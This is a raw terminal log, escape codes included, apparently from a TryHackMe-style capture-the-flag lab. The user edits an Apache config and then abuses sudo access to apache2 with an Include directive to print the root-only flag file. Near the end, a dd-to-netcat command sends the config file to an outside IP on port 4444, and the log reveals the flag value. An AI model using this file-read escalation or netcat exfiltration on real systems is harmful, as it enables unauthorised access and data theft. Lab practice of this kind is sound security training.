[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[12d[?25l[?12l[?25h[13d[?25l[?12l[?25h[14d[?25l[?12l[?25h[15d[?25l[?12l[?25h[16d[?25l[?12l[?25h[17d[?25l[?12l[?25h[18d[?25l[?12l[?25h[19d[?25l[?12l[?25h[20d[?25l[?12l[?25h[21d[?25l[25d[K[?12l[?25h[22d[?25l[?12l[?25h[23d[?25l[?12l[?25h[24d[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m#[38;5;208m [6b[36m|[38;5;208m [6b[36m`-- *.conf[39m(B[m[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m#[38;5;208m [6b[36m|-- conf-enabled[39m(B[m[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m#[38;5;208m [6b[36m|[38;5;208m [6b[36m`-- *.conf[39m(B[m[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m# [38;5;208m      [36m`-- sites-enabled[39m(B[m[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m#[38;5;208m [6b[36m [38;5;208m [6b[36m`-- *.conf[39m(B[m[?25l[?12l[?25h7[2;25r8[25d
+[1;27r[24;1H[36m#[39m(B[m[?25l[26d[J[27d[?12l[?25h[27;1H[?1049l[23;0;0t[?1l>[?2004l[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ nano /home/dolivaw/apache.confnano[1P[1P[1P[1P[1@v[1@i[1@m
+[?2004l[?1049h[22;0;0t[>4;2m[?1h=[?2004h[?1004h[1;27r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[27;1H"~/apache.conf" 232L, 7362B[2;1H½[6n[2;1H  [3;1HPzz\[0%m[6n[3;1H           [1;1H[>c]10;?]11;?[1;1H[34m# This is the main Apache server configuration file.  It contains the
+# configuration directives that give the server its instructions.[m[2;66H[K[3;1H[34m# See http://httpd.apache.org/docs/2.4/ for detailed information about[m[3;71H[K[4;1H[34m# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+# hints.
+#
+#
+# Summary of how the Apache 2 configuration works in Debian:
+# The Apache 2 web server configuration in Debian is quite different to
+# upstream's suggested way to configure the web server. This is because Debian's
+# default Apache2 installation attempts to make adding and removing modules,
+# virtual hosts, and extra configuration directives as flexible as possible, in
+# order to make automating the changes and administering the server as easy as
+# possible.
+
+# It is split into several files forming the configuration hierarchy outlined
+# below, all located in the /etc/apache2/ directory:
+#
+#       /etc/apache2/
+#       |-- apache2.conf
+#       |       `--  ports.conf
+#       |-- mods-enabled
+#       |       |-- *.load
+#       |       `-- *.conf
+#       |-- conf-enabled
+#       |       `-- *.conf[m[27;87H1,1[11CTop[1;1H[?25h[?12$p[?25l[27;77HG[1;1H[27;77H [26;1H[27m[23m[29m[m[H[2J[1;1H[34m# requests.
+#
+# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+# Use mod_remoteip instead.
+#[m
+[36mLogFormat[m [31m"%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\""[m vhost_combined
+[36mLogFormat[m [31m"%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\""[m combined
+[36mLogFormat[m [31m"%h %l %u %t \"%r\" %>s %O"[m common
+[36mLogFormat[m [31m"%{Referer}i -> %U"[m [31mreferer[m
+[36mLogFormat[m [31m"%{User-agent}i"[m agent
+
+[34m# Include of directories ignores editors' and dpkg's backup files,
+# see README.Debian for details.
+
+# Include generic snippets of statements[m
+IncludeOptional conf-enabled/*.conf
+
+[34m# Include the virtual host configurations:[m
+IncludeOptional sites-enabled/*.conf
+
+[34m# vim: syntax=apache ts=4 sw=4 sts=4 sr noet[m
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_LOG_DIR=/var/log/apache2[27;87H232,1[9CBot[26;1H[?25h[?25l[27;77HG[26;1H[27;77H [26;1H[?25h[?25l[27;77Hk[26;1H[27;77H [25;1H[27;89H1[25;1H[?25h[?25l[27;77Hk[25;1H[27;77H [24;1H[27;89H0[24;1H[?25h[?25l[27;77Hk[24;1H[27;77H [23;1H[27;88H29[23;1H[?25h[?25l[27;77Hk[23;1H[27;77H [22;1H[27;89H8[22;1H[?25h[?25l[27;77Hi[22;1H[27;77H [22;1H[27;1H[1m-- INSERT --[m[27;87H[K[27;87H228,1[9CBot[22;1H[?25h[?25l[34m#APACHE_RUN_DIR=/var/run/apache2[m[27;91H2[22;2H[?25h[?25l[27;89H9[23;2H[?25h[?25l[27;91H1[23;1H[?25h[?25l[34m#APACHE_RUN_USER=www-data[m[27;91H2[23;2H[?25h[?25l[27;88H30[24;2H[?25h[?25l[27;91H1[24;1H[?25h[?25l[34m#APACHE_RUN_GROUP=www-data[m[27;91H2[24;2H[?25h[?25l[27;89H1[25;2H[?25h[?25l[27;91H1[25;1H[?25h[?25l[34m#APACHE_PID_FILE=/var/run/apache2/apache2.pid[m[27;91H2[25;2H[?25h[?25l[27;89H2[26;2H[?25h[?25l[27;91H1[26;1H[?25h[?25l[34m#APACHE_LOG_DIR=/var/log/apache2[m[27;91H2[26;2H[?25h[?25l[27;91H33[26;33H[?25h[?25l[1;26r[26;1H
+[1;27r[27;87H[K[27;87H233,1[9CBot[26;1H[?25h[?25l[1;26r[26;1H
+[1;27r[27;87H[K[27;87H234,1[9CBot[26;1H[?25h[?25l[36mUser[m www-data[15C[?25h[?25l[1;26r[1;1H[2M[1;27r[25;1H[36mGroup[m www-data
+[36mPidFile[m /var/run/apache2/apache2.pid[27;11H[1m(paste) --[m[27;87H[K[26;37H[?25h[?25l[1;26r[1;1H[2M[1;27r[25;1H[36mLogLevel[m [31mwarn[m[27;11H[1m--a[m[27;13H[K[27;87H238,1[9CBot[26;1H[?25h[27;1H[K[26;1H[?25l[27;77H^[[26;1H[27;77H  [26;1H[27;87H238,0-1[7CBot[26;1H[?25h[?25l[27;77H:[26;1H[27;77H[K[27;1H:[?25hx[?25l[?2004l[>4;m"apache.conf" 238L, 7449B written[23;2t[23;1t
+[?1004l[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7mSetEnv APACHE_RUN_DIR /var/run/apache2[27m
+[7mSetEnv APACHE_RUN_USER www-data[27m
+[7mSetEnv APACHE_RUN_GROUP www-data[27m
+[7mSetEnv APACHE_PID_FILE /var/run/apache2/apache2.pid[27m
+[7mSetEnv APACHE_LOG_DIR /var/log/apache2[27m
+[A[A[A[A[A]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ SetEnv APACHE_RUN_DIR /var/run/apache2
+SetEnv APACHE_RUN_USER www-data
+SetEnv APACHE_RUN_GROUP www-data
+SetEnv APACHE_PID_FILE /var/run/apache2/apache2.pid
+SetEnv APACHE_LOG_DIR /var/log/apache2
+[A
+[?2004lSetEnv: command not found
+SetEnv: command not found
+SetEnv: command not found
+SetEnv: command not found
+SetEnv: command not found
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [KSetEnv APACHE_LOG_DIR /var/log/apache2PID_FILE /var/run/apache2/apache2.pid[19PRUN_GROUP www-data[Kvim apache.conf 
+[?2004l[?1049h[22;0;0t[>4;2m[?1h=[?2004h[?1004h[1;27r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[27;1H"apache.conf" 238L, 7449B[2;1H½[6n[2;1H  [3;1HPzz\[0%m[6n[3;1H           [1;1H[>c]10;?]11;?[1;1H[36mLogFormat[m [31m"%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\""[m combined
+[36mLogFormat[m [31m"%h %l %u %t \"%r\" %>s %O"[m common[2;45H[K[3;1H[36mLogFormat[m [31m"%{Referer}i -> %U"[m [31mreferer[m[3;38H[K[4;1H[36mLogFormat[m [31m"%{User-agent}i"[m agent
+
+[34m# Include of directories ignores editors' and dpkg's backup files,
+# see README.Debian for details.
+
+# Include generic snippets of statements[m
+IncludeOptional conf-enabled/*.conf
+
+[34m# Include the virtual host configurations:[m
+IncludeOptional sites-enabled/*.conf
+
+[34m# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+#APACHE_RUN_DIR=/var/run/apache2
+#APACHE_RUN_USER=www-data
+#APACHE_RUN_GROUP=www-data
+#APACHE_PID_FILE=/var/run/apache2/apache2.pid
+#APACHE_LOG_DIR=/var/log/apache2[m
+
+[36mUser[m www-data
+[36mGroup[m www-data
+[36mPidFile[m /var/run/apache2/apache2.pid
+[36mLogLevel[m [31mwarn[m[27;87H238,0-1[7CBot[26;1H[?25h[?12$p[?25l[27;77Hi[26;1H[27;77H [26;1H
+[1m-- INSERT --[m[27;13H[K[27;87H238,1[9CBot[26;1H[?25h[?25l[1;26r[26;1H
+[1;27r[27;87H[K[27;87H239,1[9CBot[26;1H[?25h[?25l[36mSetEnv[m APACHE_RUN_DIR /var/run/apache2[26;5H[?25h[?25l[1;26r[26;1H
+[1;27r[26;1H[36mSetEnv[m APACHE_RUN_USER www-data[27;11H[1m(paste) --[m[27;87H[K[26;14H[?25h[?25l[1;26r[26;1H
+[1;27r[26;1H[36mSetEnv[m APACHE_RUN_GROUP www-data[26;13H[?25h[?25l[1;26r[26;1H
+[1;27r[26;1H[36mSetEnv[m APACHE_PI[?25h[?25lD_FILE /var/run/apache2/apache2.pid[26;14H[?25h[?25l[1;26r[1;1H[2M[1;27r[25;1H[36mSetEnv[m APACHE_LOG_DIR /var/log/apache2[27;11H[1m--a[m[27;13H[K[27;87H244,1[9CBot[26;1H[?25h[27;1H[K[26;1H[?25l[27;77H^[[26;1H[27;77H  [26;1H[27;87H244,0-1[7CBot[26;1H[?25h[?25l[27;77H:[26;1H[27;77H[K[27;1H:[?25hx[?25l[?2004l[>4;m"apache.conf" 244L, 7645B written[23;2t[23;1t
+[?1004l[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [7msudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop[27msudo apache2 -f /home/dolivaw/apache.conf -c "Include $LFILE" -k stop
+[?2004l[Sat Mar 15 13:25:42.925561 2025] [core:warn] [pid 2138] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sat Mar 15 13:25:42.925835 2025] [core:warn] [pid 2138] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:25:42.929387 2025] [core:warn] [pid 2138:tid 139697969178496] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:25:42.929678 2025] [core:warn] [pid 2138:tid 139697969178496] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sat Mar 15 13:25:42.929704 2025] [core:warn] [pid 2138:tid 139697969178496] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00526: Syntax error on line 1 of /root/root.txt:
+Invalid command 'THM{2a279561f5eea907f7617df3982cee24}', perhaps misspelled or defined by a module not included in the server configuration
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [K^C[?2004l[?2004h[?2004l
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ dd if ap   =apache.conf status=progrss |    ess | c nc 10.8.61.245 4444
+[?2004l14+1 records in
+14+1 records out
+7645 bytes (7.6 kB, 7.5 KiB) copied, 0.000412142 s, 18.5 MB/s
+[?2004h]0;dolivaw@ubuntu-jammy: ~[01;32mdolivaw@ubuntu-jammy[00m:[01;34m~[00m$ [Kexit
+[?2004llogout
+Connection to robots.thm closed.
+
+Script done on 2025-03-15 17:00:51+03:00 [COMMAND_EXIT_CODE="0"]
